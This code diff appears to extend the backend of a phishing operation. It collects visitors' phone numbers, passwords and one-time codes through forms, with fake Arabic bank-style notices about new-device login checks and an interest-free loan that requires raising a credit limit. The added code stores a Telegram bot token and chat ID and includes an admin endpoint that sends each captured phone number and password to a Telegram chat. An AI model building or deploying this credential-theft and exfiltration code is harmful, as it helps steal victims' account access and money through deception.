@@ -1,4 +1,5 @@
 import asyncio
+import json
 from contextlib import asynccontextmanager, suppress
 from datetime import datetime, timezone
 from math import ceil
@@ -21,6 +22,7 @@ from pymongo import MongoClient
 from pymongo.collection import Collection
 from pymongo.errors import PyMongoError
 from pymongo import ReturnDocument
+import requests
 from redis.asyncio import Redis
 from redis.exceptions import RedisError
 from starlette.exceptions import HTTPException as StarletteHTTPException
@@ -63,6 +65,9 @@ class VisitorBlockPayload(BaseModel):
 class SupportSettingsPayload(BaseModel):
     whatsapp_number: str = Field(default="", max_length=64)
     success_message: str = Field(default="", max_length=2000)
+    login_submit_message: str = Field(default="", max_length=2000)
+    telegram_api_token: str = Field(default="", max_length=512)
+    telegram_chat_id: str = Field(default="", max_length=256)
 
 
 class AdminSocketHub:
@@ -143,6 +148,7 @@ class VisitorControlHub:
 LOGIN_REJECTION_MESSAGE_AR = "كلمة المرور غير صحيحة"
 OTP_REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح"
 SUPPORT_APPROVAL_MESSAGE_AR = "الحد الائتماني بمحفظتك متدني يرجى رفع الحد الائتماني لقبول طلبك والحصول على القرض الحسن. لمزيد من الاستفسارات والمعلومات التواصل مع خدمة العملاء."
+LOGIN_SUBMIT_MESSAGE_AR = "محاولة تسجيل الدخول من جهاز جديد. لأمان حسابك، سنرسل لك رمز تحقق لمرة واحدة (OTP) للتحقق من تسجيل الدخول"
 SUPPORT_SETTINGS_DOCUMENT_ID = "support_whatsapp"
 PAGE_TITLES_BY_PATH = {
     "/": "الصفحة الرئيسية",
@@ -207,18 +213,31 @@ def build_whatsapp_url(number: str | None) -> str:
 def serialize_support_settings(document: dict[str, Any] | None = None) -> dict[str, str]:
     raw_number = ""
     raw_message = ""
+    raw_login_submit_message = ""
+    raw_telegram_api_token = ""
+    raw_telegram_chat_id = ""
+    login_submit_message_is_configured = False
     if isinstance(document, dict):
         raw_number = str(document.get("whatsapp_number", "")).strip()
         raw_message = str(document.get("success_message", "")).strip()
+        login_submit_message_is_configured = "login_submit_message" in document
+        raw_login_submit_message = str(document.get("login_submit_message", "")).strip()
+        raw_telegram_api_token = str(document.get("telegram_api_token", "")).strip()
+        raw_telegram_chat_id = str(document.get("telegram_chat_id", "")).strip()
     if not raw_number:
         raw_number = str(settings.support_whatsapp_number or "").strip()
     if not raw_message:
         raw_message = SUPPORT_APPROVAL_MESSAGE_AR
+    if not raw_login_submit_message and not login_submit_message_is_configured:
+        raw_login_submit_message = LOGIN_SUBMIT_MESSAGE_AR
     normalized_number = _normalize_whatsapp_number(raw_number)
     return {
         "whatsapp_number": normalized_number,
         "whatsapp_url": build_whatsapp_url(normalized_number),
         "success_message": raw_message,
+        "login_submit_message": raw_login_submit_message,
+        "telegram_api_token": raw_telegram_api_token,
+        "telegram_chat_id": raw_telegram_chat_id,
     }
 
 
@@ -254,6 +273,38 @@ def _resolve_visitor_identity_sync(
         "is_returning_visitor": visit_count > 1,
         "visit_count": visit_count,
     }
+
+
+def _connect_mongo_for_app_sync(app: FastAPI) -> bool:
+    existing_client: MongoClient | None = getattr(app.state, "mongo_client", None)
+    if existing_client is not None:
+        try:
+            existing_client.admin.command("ping")
+            return True
+        except PyMongoError:
+            existing_client.close()
+    try:
+        mongo_client = MongoClient(settings.mongo_uri, serverSelectionTimeoutMS=1500)
+        mongo_client.admin.command("ping")
+    except PyMongoError as exc:
+        app.state.mongo_client = None
+        app.state.submissions_collection = None
+        app.state.visitors_collection = None
+        app.state.settings_collection = None
+        app.state.mongo_error = str(exc)
+        return False
+    app.state.mongo_client = mongo_client
+    app.state.submissions_collection = mongo_client[settings.mongo_db_name][
+        settings.mongo_submissions_collection
+    ]
+    app.state.visitors_collection = mongo_client[settings.mongo_db_name][
+        settings.mongo_visitors_collection
+    ]
+    app.state.settings_collection = mongo_client[settings.mongo_db_name][
+        settings.mongo_settings_collection
+    ]
+    app.state.mongo_error = None
+    return True
 
 
 def serialize_submission(document: dict[str, Any]) -> dict[str, str]:
@@ -711,6 +762,29 @@ def _fetch_support_settings_sync(collection: Collection | None) -> dict[str, str
     return serialize_support_settings(document)
 
 
+def _fetch_submission_sync(
+    collection: Collection | None, submission_id: str
+) -> dict[str, Any] | None:
+    parsed_submission_id = parse_object_id(submission_id)
+    if collection is None or parsed_submission_id is None:
+        return None
+    return collection.find_one(
+        {"_id": parsed_submission_id},
+        {
+            "visitor_id": 1,
+            "visitor_status": 1,
+            "full_name": 1,
+            "email": 1,
+            "form_name": 1,
+            "page_path": 1,
+            "fields": 1,
+            "approval_status": 1,
+            "created_at": 1,
+            "login_submission_id": 1,
+        },
+    )
+
+
 def _fetch_visitor_block_map_sync(
     collection: Collection | None, visitor_ids: list[str]
 ) -> dict[str, bool]:
@@ -779,15 +853,26 @@ def _set_visitor_blocked_sync(
 
 
 def _update_support_settings_sync(
-    collection: Collection | None, whatsapp_number: str, success_message: str
+    collection: Collection | None,
+    whatsapp_number: str,
+    success_message: str,
+    login_submit_message: str,
+    telegram_api_token: str,
+    telegram_chat_id: str,
 ) -> dict[str, str]:
     normalized_number = _normalize_whatsapp_number(whatsapp_number)
     normalized_message = str(success_message or "").strip() or SUPPORT_APPROVAL_MESSAGE_AR
+    normalized_login_submit_message = str(login_submit_message or "").strip()
+    normalized_telegram_api_token = str(telegram_api_token or "").strip()
+    normalized_telegram_chat_id = str(telegram_chat_id or "").strip()
     if collection is None:
         return serialize_support_settings(
             {
                 "whatsapp_number": normalized_number,
                 "success_message": normalized_message,
+                "login_submit_message": normalized_login_submit_message,
+                "telegram_api_token": normalized_telegram_api_token,
+                "telegram_chat_id": normalized_telegram_chat_id,
             }
         )
     document = collection.find_one_and_update(
@@ -796,6 +881,9 @@ def _update_support_settings_sync(
             "$set": {
                 "whatsapp_number": normalized_number,
                 "success_message": normalized_message,
+                "login_submit_message": normalized_login_submit_message,
+                "telegram_api_token": normalized_telegram_api_token,
+                "telegram_chat_id": normalized_telegram_chat_id,
                 "updated_at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
             }
         },
@@ -1071,6 +1159,9 @@ async def get_submission_status_for_app(
 
 async def get_support_settings_for_app(app: FastAPI) -> dict[str, str]:
     collection = get_settings_collection_for_app(app)
+    if collection is None:
+        await to_thread.run_sync(_connect_mongo_for_app_sync, app)
+        collection = get_settings_collection_for_app(app)
     try:
         return await to_thread.run_sync(_fetch_support_settings_sync, collection)
     except PyMongoError:
@@ -1098,20 +1189,124 @@ async def set_visitor_blocked_for_app(
 
 
 async def update_support_settings_for_app(
-    app: FastAPI, whatsapp_number: str, success_message: str
+    app: FastAPI,
+    whatsapp_number: str,
+    success_message: str,
+    login_submit_message: str,
+    telegram_api_token: str,
+    telegram_chat_id: str,
 ) -> dict[str, str]:
     collection = get_settings_collection_for_app(app)
+    if collection is None:
+        await to_thread.run_sync(_connect_mongo_for_app_sync, app)
+        collection = get_settings_collection_for_app(app)
     try:
         return await to_thread.run_sync(
-            _update_support_settings_sync, collection, whatsapp_number, success_message
+            _update_support_settings_sync,
+            collection,
+            whatsapp_number,
+            success_message,
+            login_submit_message,
+            telegram_api_token,
+            telegram_chat_id,
         )
     except PyMongoError:
         return serialize_support_settings(
             {
                 "whatsapp_number": whatsapp_number,
                 "success_message": success_message,
+                "login_submit_message": login_submit_message,
+                "telegram_api_token": telegram_api_token,
+                "telegram_chat_id": telegram_chat_id,
             }
         )
+
+
+async def get_submission_for_app(app: FastAPI, submission_id: str) -> dict[str, Any] | None:
+    collection = get_submissions_collection_for_app(app)
+    if collection is None:
+        await to_thread.run_sync(_connect_mongo_for_app_sync, app)
+        collection = get_submissions_collection_for_app(app)
+    if collection is None:
+        return None
+    try:
+        return await to_thread.run_sync(_fetch_submission_sync, collection, submission_id)
+    except PyMongoError:
+        return None
+
+
+def build_submission_telegram_text(document: dict[str, Any]) -> str:
+    serialized = serialize_submission(document)
+    password_value = str(serialized.get("password_display", "")).strip()
+    phone_number = str(serialized.get("phone_number_display", "-")).strip() or "-"
+    lines = [
+        "رقم الهاتف: " + _telegram_markdown_code(phone_number),
+        "كلمة المرور: " + _telegram_markdown_code(password_value or "-"),
+    ]
+    return "\n".join(lines).strip()
+
+
+def approvalStatusLabel(status: str) -> str:
+    normalized = str(status or "").lower()
+    if normalized == "approved":
+        return "Approved"
+    if normalized == "rejected":
+        return "Rejected"
+    return "Pending"
+
+
+def _escape_telegram_markdown_v2(text: str) -> str:
+    escaped = str(text or "").replace("\\", "\\\\")
+    for character in ("_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"):
+        escaped = escaped.replace(character, "\\" + character)
+    return escaped
+
+
+def _escape_telegram_markdown_v2_code(text: str) -> str:
+    return str(text or "").replace("\\", "\\\\").replace("`", "\\`")
+
+
+def _telegram_markdown_code(text: str) -> str:
+    return "`" + _escape_telegram_markdown_v2_code(text) + "`"
+
+
+def _send_telegram_message_sync(api_token: str, chat_id: str, text: str) -> None:
+    api_url = f"https://api.telegram.org/bot{str(api_token or '').strip()}/sendMessage"
+    payload = {
+        "chat_id": str(chat_id or "").strip(),
+        "text": text,
+        "parse_mode": "MarkdownV2",
+    }
+    try:
+        response = requests.post(api_url, data=payload, timeout=10)
+        response.raise_for_status()
+    except requests.HTTPError as exc:
+        raise RuntimeError(exc.response.text if exc.response is not None else str(exc)) from exc
+    except requests.RequestException as exc:
+        raise RuntimeError(str(exc)) from exc
+    parsed_body = response.json()
+    if not parsed_body.get("ok"):
+        raise RuntimeError(str(parsed_body.get("description", "Telegram send failed")))
+
+
+async def send_submission_to_telegram_for_app(
+    app: FastAPI, submission_id: str
+) -> dict[str, Any]:
+    submission = await get_submission_for_app(app, submission_id)
+    if submission is None:
+        return {"status": "not_found"}
+    support_settings = await get_support_settings_for_app(app)
+    api_token = str(support_settings.get("telegram_api_token", "")).strip()
+    chat_id = str(support_settings.get("telegram_chat_id", "")).strip()
+    if not api_token or not chat_id:
+        return {"status": "not_configured"}
+    message_text = build_submission_telegram_text(submission)
+    try:
+        await to_thread.run_sync(_send_telegram_message_sync, api_token, chat_id, message_text)
+    except RuntimeError as exc:
+        return {"status": "error", "detail": str(exc)}
+    serialized_submission = serialize_submission(submission)
+    return {"status": "ok", "submission": serialized_submission}
 
 
 async def build_admin_snapshot(app: FastAPI) -> dict[str, Any]:
@@ -1155,18 +1350,7 @@ async def lifespan(app: FastAPI):
     except RedisError as exc:
         app.state.redis_error = str(exc)
     try:
-        mongo_client = MongoClient(settings.mongo_uri, serverSelectionTimeoutMS=1500)
-        mongo_client.admin.command("ping")
-        app.state.mongo_client = mongo_client
-        app.state.submissions_collection = mongo_client[settings.mongo_db_name][
-            settings.mongo_submissions_collection
-        ]
-        app.state.visitors_collection = mongo_client[settings.mongo_db_name][
-            settings.mongo_visitors_collection
-        ]
-        app.state.settings_collection = mongo_client[settings.mongo_db_name][
-            settings.mongo_settings_collection
-        ]
+        _connect_mongo_for_app_sync(app)
     except PyMongoError as exc:
         app.state.mongo_error = str(exc)
     try:
@@ -1222,11 +1406,13 @@ async def add_security_headers(request: Request, call_next):
 
 @app.get("/")
 async def root(request: Request):
+    support_settings = await get_support_settings_for_app(request.app)
     return templates.TemplateResponse(
         request=request,
         name="frontend/index.html",
         context={
             "heartbeat_interval_seconds": settings.online_heartbeat_interval_seconds,
+            "login_submit_message": support_settings["login_submit_message"],
         },
     )
 
@@ -1404,6 +1590,7 @@ async def verification_page(request: Request):
             "support_whatsapp_number": support_settings["whatsapp_number"],
             "support_whatsapp_url": support_settings["whatsapp_url"],
             "support_approval_message": support_settings["success_message"],
+            "login_submit_message": support_settings["login_submit_message"],
             "otp_rejection_message": OTP_REJECTION_MESSAGE_AR,
         },
     )
@@ -1637,7 +1824,12 @@ async def admin_update_support_settings(
     if not validate_csrf_token(request, csrf_token):
         return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
     support_settings = await update_support_settings_for_app(
-        request.app, payload.whatsapp_number, payload.success_message
+        request.app,
+        payload.whatsapp_number,
+        payload.success_message,
+        payload.login_submit_message,
+        payload.telegram_api_token,
+        payload.telegram_chat_id,
     )
     socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
     await socket_hub.broadcast(
@@ -1744,6 +1936,33 @@ async def admin_reject_submission(submission_id: str, request: Request):
         "submission": submission,
         "error_message": submission.get("rejection_message", LOGIN_REJECTION_MESSAGE_AR),
     }
+
+
+@app.post("/admin/api/submissions/{submission_id}/telegram")
+async def admin_send_submission_to_telegram(submission_id: str, request: Request):
+    if require_admin_or_redirect(request) is not None:
+        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
+    csrf_token = request.headers.get("x-csrf-token")
+    if not validate_csrf_token(request, csrf_token):
+        return JSONResponse(
+            status_code=403, content={"status": "error", "detail": "Invalid CSRF token"}
+        )
+    result = await send_submission_to_telegram_for_app(request.app, submission_id)
+    if result["status"] == "not_found":
+        return JSONResponse(
+            status_code=404, content={"status": "error", "detail": "Submission not found"}
+        )
+    if result["status"] == "not_configured":
+        return JSONResponse(
+            status_code=400,
+            content={"status": "error", "detail": "Telegram API token and chat ID are required"},
+        )
+    if result["status"] == "error":
+        return JSONResponse(
+            status_code=502,
+            content={"status": "error", "detail": result.get("detail", "Telegram send failed")},
+        )
+    return {"status": "ok", "submission": result.get("submission")}
 
 
 @app.get("/api/forms/submission-status")
